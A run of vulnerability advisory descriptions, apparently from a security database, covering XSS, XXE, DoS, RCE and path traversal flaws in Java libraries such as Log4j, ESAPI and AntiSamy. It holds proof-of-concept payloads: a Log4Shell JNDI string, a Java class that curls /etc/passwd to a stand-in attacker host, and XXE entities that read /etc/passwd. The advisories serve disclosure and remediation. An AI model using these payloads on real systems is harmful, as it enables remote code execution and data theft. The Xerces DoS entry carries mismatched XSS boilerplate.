                "description": "## Overview\n\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nvia HTML5 entities, as demonstrated by use of `&colon;` to construct a javascript: URL.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `org.owasp.antisamy:antisamy` to version 1.5.7 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/82da009e733a989a57190cd6aa1b6824724f6d36)\n\n- [GitHub Issue](https://github.com/nahsra/antisamy/issues/10)\n",

Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash.

Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nThere is no fixed version for `javax.servlet:jstl`.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",

                "description": "## Overview\n\n[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE).\nApache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.\r\n\r\nFrom log4j 2.15.0, JNDI LDAP endpoints are restricted to localhost by default.\r\n\r\n\r\n## PoC\r\nWhen an application uses log4j to log user input, an attacker can exploit this vulnerability, by supplying a malicious string that the application logs - for example,  `${jndi:ldap://someurl/Evil}`. This causes the application to execute a malicious class supplied by an attacker’s LDAP server (`someurl/Evil` in this example).\r\n\r\nFor example, the vulnerability can be used to inject this malicious class into an application:\r\n```java\r\npublic class Evil implements ObjectFactory  {\r\n   @Override\r\n   public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {\r\n       Runtime.getRuntime().exec(\"curl -F 'file=@/etc/passw‍đ' https://someurl/upload\");\r\n       return  null;\r\n   }\r\n}\r\n```\r\nThis causes the application to disclose the `etc/passwd` file on the system, and send it to a remote attacker.\r\n\r\n## Further Remediation Options\r\nIf upgrading the version is not possible, we strongly recommend to mitigate the vulnerability using one of these methods:\r\n\r\n* Remove `JndiLookup.class` from the class path (i.e: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. While not pertinent to log4shell, consider also removing `JndiManager`, `JMSAppender` and `SMTPAppender` if you are not using them, as there are unconfirmed reports they could be leveraged in similar attacks in the future.\r\n* Partial mitigation: disable lookups via system properties or environmental variables. If you use log4j >=2.10.0, you can set the system property `LOG4J_FORMAT_MSG_NO_LOOKUPS` or the environmental variable `Dlog4j2.formatMsgNoLookups` to `true`. (RCE is possible in some non-default Pattern Layout configurations that use a Context Lookup or a Thread Context Map pattern.)\r\n\r\n<br>Upgrading your JDK versions is not enough to mitigate this vulnerability in all circumstances, as it was proven that setting the `com.sun.jndi.ldap.object.trustURLCodebase` property to `false` is not enough.\r\n<br>For more remediation advice, please visit the [Log4j Remediation Cheat Sheet](https://snyk.io/blog/log4shell-remediation-cheat-sheet/) post.\r\n\r\n\r\n**Note**: `org.apache.logging.log4j:log4j-api` was originally deemed vulnerable, but Apache maintainers have since [clarified](https://issues.apache.org/jira/browse/LOG4J2-3201) that this only affects `org.apache.logging.log4j:log4j-core`.\n\n## Remediation\n\nUpgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.15.0 or higher.\n\n\nUse [this guide](https://snyk.io/blog/find-fix-log4shell-quickly-snyk/) to scan your projects for the Log4Shell vulnerability.\n\n## References\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3198)\n\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/LOG4J2-3201)\n\n- [Apache Security Advisory](https://logging.apache.org/log4j/2.x/security.html)\n\n- [GitHub PR](https://github.com/apache/logging-log4j2/pull/608)\n\n- [PoC](https://github.com/Kirill89/log4shell-vulnerable-server)\n\n- [Snyk Blog and Vulnerability Breakdown](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/51183)\n\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)\n",

                "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `Validator.getValidSafeHTML()` and `Validator.isValidSafeHTML()` methods. An incorrect regular expression for `onsiteURL` in the `antisamy-esapi.xml` configuration file can cause URLs with the `javascript:` scheme to not be sanitized.\r\n\r\n## Workaround\r\nManually edit your `antisamy-esapi.xml` configuration files to change the `onsiteURL` regular expression to:<br>\r\n\r\n`<regexp name=\"onsiteURL\" value=\"^(?!//)(?![\\p{L}\\p{N}\\\\\\.\\#@\\$%\\+&amp;;\\-_~,\\?=/!]*(&amp;colon))[\\p{L}\\p{N}\\\\\\.\\#@\\$%\\+&amp;;\\-_~,\\?=/!]*\"/>`\r\n\r\nAs a precaution, also change `offsiteURL` and `htmlTitle`:<br><br>\r\n`<regexp name=\"htmlTitle\" value=\"[\\p{L}\\p{N}\\s\\-_',:\\[\\]!\\./\\\\\\(\\)&amp[;]*\"/>`\r\n\r\n`<regexp name=\"offsiteURL\" value=\"(\\s)*((ht|f)tp(s?)://|maiolto:)[\\p{L}\\p{N}]+[\\p{L}\\p{N}\\p{Zs}\\.\\#@\\$%\\+&amp;;:\\-_~,\\?=/!\\(\\)]*(\\s)*\"/>`\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.esapi:esapi` to version 2.3.0.0 or higher.\n## References\n- [ESAPI Security Report](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin8.pdf)\n- [GitHub Commit](https://github.com/ESAPI/esapi-java-legacy/commit/9473bf4676d2b28fee93ee059099a4f4e707dc51)\n",

                "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) through the `Validator.isValidSafeHTML` method. This might result in false negatives where it reports some input as safe, even if they are not, thus continuing using them without further validation, resulting in a persisting vulnerability.\r\n\r\n**Notes:**\r\n\r\n1) This is only exploitable if the `Validator.isValidSafeHTML` method is used. \r\n\r\n2) `Validator.getValidSafeHTML` is believed to be safe to use with the default `antisamy-esapi.xml` `AntiSamy` policy file.\r\n\r\n3) The vulnerable method was deprecated in 2.5.3.0\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nThere is no fixed version for `org.owasp.esapi:esapi`.\n## References\n- [GitHub Commit](https://github.com/ESAPI/esapi-java-legacy/commit/7d4dd5ad5a3cd1d6184179fddd441dcfebf717e7)\n- [Security Advisory](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin12.pdf)\n",

                "description": "## Overview\n\n[xerces:xercesImpl](http://xerces.apache.org) is an that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\n\nAffected versions of this package are vulnerable to Denial of Service (DoS).\n`XMLScanner.java` in Apache Xerces2 Java, as used in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15 and JDK and JRE 5.0 before Update 20, and in other products, allows remote attackers to cause a denial of service (infinite loop and application hang) via malformed XML input, as demonstrated by the Codenomicon XML fuzzing framework.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `xerces:xercesImpl` to version 2.10.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/apache/xerces2-j/commit/0bdf77af1d4fd26ec2e630fb6d12e2dfa77bc12b)\n\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2009-2625)\n",

When the parser tries to parse such a document it gets stuck in an infinite loop for a long time, which consumes resources.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.2 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl)\n- [Fix Revision](https://svn.apache.org/viewvc?view=revision&revision=1897143)\n- [MarkMail](https://markmail.org/message/vcmhwbuorfgcdr6l)\n- [Release Notes](https://xerces.apache.org/xerces2-j/releases.html)\n",

The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",

When using the `Chainsaw` or `SocketAppender` components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted, deeply nested `hashmap` or `hashtable` (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve denial of service when the object is deserialized. \r\n\r\nThis issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x `org.apache.logging.log4j/log4j-core`.  \r\n\r\n*NOTE:* This vulnerability only affects products that are no longer supported by the maintainer.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash.

                "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `HTML` tag smuggling on `STYLE` content with crafted input. This is due to an improper serialization of the output which does not properly encode the supposed Cascading Style Sheets (CSS) content.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.6.6 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/0199e7e194dba5e7d7197703f43ebe22401e61ae)\n- [GitHub Release](https://github.com/nahsra/antisamy/releases/tag/v1.6.6)\n",

                "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection via alteration of local ESAPI configuration and loading XML version of the ESAPI properties file.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `org.owasp.esapi:esapi` to version 2.2.3.0 or higher.\n## References\n- [GitHub Issue](https://github.com/ESAPI/esapi-java-legacy/issues/614#issuecomment-805395354)\n- [GitHub PR](https://github.com/ESAPI/esapi-java-legacy/pull/612)\n",

                "description": "## Overview\n[commons-io:commons-io](https://search.maven.org/artifact/commons-io/commons-io) is a The Apache Commons IO library contains utility classes, stream implementations, file filters, file comparators, endian transformation classes, and much more.\n\nAffected versions of this package are vulnerable to Directory Traversal via calling the method FileNameUtils.normalize using an improper string like `//../foo` or `\\\\..\\foo`, which may allow access to files in the parent directory.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root 